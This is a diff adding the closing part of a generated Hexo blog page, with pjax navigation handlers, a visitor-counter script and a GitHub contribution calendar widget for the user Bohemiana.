+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      pjax.loadUrl('/404.html')
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start -->
+  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
+  <script data-pjax>
+        function GithubCalendarConfig(){
+            var git_githubapiurl ="https://githubcalendarapi.shiguang666.eu.org/api?user=Bohemiana";
+            var git_color =['#ebedf0', '#f0fff4', '#dcffe4', '#bef5cb', '#85e89d', '#34d058', '#28a745', '#22863a', '#176f2c', '#165c26', '#144620'];
+            var git_user ="Bohemiana";
+            var parent_div_git = document.getElementById('recent-posts');
+            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
+            if(parent_div_git && location.pathname =='/'){
+                console.log("已挂载hexo-github-calendar https://github.com/Barry-Flynn/hexo-github-calendar");
+                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
+            };
+            GithubCalendar(git_githubapiurl,git_color,git_user)
+        }
+        if(document.getElementById('recent-posts')){
+            GithubCalendarConfig()
+        }
+    </script>
+    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
+    <style></style><!-- hexo injector body_end end --></body></html>
